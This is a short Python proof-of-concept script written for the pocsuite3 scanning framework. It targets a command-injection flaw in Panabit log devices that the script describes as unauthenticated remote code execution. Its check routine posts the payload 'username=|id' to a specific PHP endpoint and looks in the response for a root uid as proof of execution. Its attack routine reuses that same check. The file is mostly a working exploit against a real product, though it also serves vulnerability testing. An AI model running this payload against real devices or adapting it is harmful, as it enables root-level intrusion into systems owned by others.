#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2021/12/18 8:16 PM
# @Author  : waffle
# @Email   : ox01024@163.com
# @File    : panabitlog_rce.py

from collections import OrderedDict
from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
    get_listener_ip,
    get_listener_port,
)
from pocsuite3.lib.core.interpreter_option import (
    OptString,
    OptDict,
    OptIP,
    OptPort,
    OptBool,
    OptInteger,
    OptFloat,
    OptItems,
)
from pocsuite3.modules.listener import REVERSE_PAYLOAD


class DemoPOC(POCBase):
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "waffle"  # PoC作者的大名
    vulDate = "2021-12-18"  # 漏洞公开的时间,不知道就写今天
    createDate = "2021-12-18"  # 编写 PoC 的日期
    updateDate = "2021-12-18"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://forum.butian.net/share/811"]  # 漏洞地址来源,0day不用写
    name = "Panabit日志设备前台RCE"  # PoC 名称
    appPowerLink = "https://www.panabit.com/"  # 漏洞厂商主页地址
    appName = "Panabit"  # 漏洞应用名称
    appVersion = "未知"  # 漏洞影响版本
    vulType = VUL_TYPE.CODE_EXECUTION  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    drok='"Maintain/cloud_index.php" +"checkcode.php?a="'
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
            前台RCE
        """  # 漏洞简要描述
    pocDesc = """
            poc的用法描述
        """  # POC用法描述

    def _check(self):
        poc_path='/account/sy_addmount.php'
        poc_url=self.url+poc_path
        poc_payload='username=|id'
        headers={"Content-Type":"application/x-www-form-urlencoded"}
        r=requests.post(poc_url,headers=headers,data=poc_payload)
        if "uid=0(root) gid=0(wheel) groups=0(wheel)" in r.text:
            id=r.text
            return poc_url,headers,poc_payload,poc_path,id
        return False



    def _verify(self):
        result = {}
        p = self._check()
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['headers'] = p[1]
            result['VerifyInfo']['Postdata'] = p[2]
            result['VerifyInfo']['Path'] = p[3]
            result['VerifyInfo']['Userid']=p[4]
        # 的parse_output通用结果处理函数对_verify和_attack结果进行处理。
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            # 输出调用成功信息
            output.success(result)
        else:
            # 输出调用失败
            output.fail('target is not vulnerable')
        return output

# 注册 DemoPOC 类
register_poc(DemoPOC)
